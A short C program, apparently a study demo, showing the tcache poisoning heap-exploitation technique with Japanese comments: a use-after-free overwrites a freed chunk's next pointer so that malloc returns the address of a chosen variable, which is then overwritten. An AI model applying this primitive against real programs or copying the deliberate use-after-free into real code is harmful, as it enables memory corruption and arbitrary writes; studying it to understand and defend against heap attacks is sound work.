#include <stdio.h>
#include <stdlib.h>
#include "malloc_struct.h"

// tcache poisning
// tcacheはunlinkのときにチェックされないので
// use after free によって、nextのアドレスを任意の値に
// 書き換えたい
int main(void){
	unsigned long *ma, *mb, *victim;
	unsigned long var = 0xdeadbeef;

	printf("&var   : %p\nvar    = %#lx\n\n", &var, var);

	ma = malloc(0x18);
	mb = malloc(0x18);

	free(mb);
	free(ma);
	// a -> b
	puts("Exploit!");
	((tcache_entry*)ma)->next = (void*)&var; // vuln
	// a -> &var

	malloc(0x18);
	// aを取り出し
	victim = malloc(0x18);	// alloc var from tcache
	// varを取り出せてしまう
	*victim = 0xcafebabe;	// overwrite
	// victimはvarのアドレスだったので、そこを書き換え

	printf("victim = %p\nvar    = %#lx\n", victim, var);
	// deadbeef からcafebabeになってしまう
}
